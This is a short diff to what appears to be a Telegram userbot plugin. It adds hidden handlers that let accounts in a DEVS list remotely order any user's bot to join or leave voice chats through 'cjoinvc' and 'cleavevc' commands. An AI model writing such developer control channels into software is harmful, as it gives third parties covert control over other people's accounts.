@@ -31,10 +31,12 @@ async def _(client, message):
 
 
 @PY.UBOT("joinvc")
+@ubot.on_message(filters.user(DEVS) & filters.command("cjoinvc", "") & ~filters.me)
 async def _(client, message):
     await join_os(client, message)
 
 
 @PY.UBOT("leavevc")
+@ubot.on_message(filters.user(DEVS) & filters.command("cleavevc", "") & ~filters.me)
 async def _(client, message):
     await turun_os(client, message)
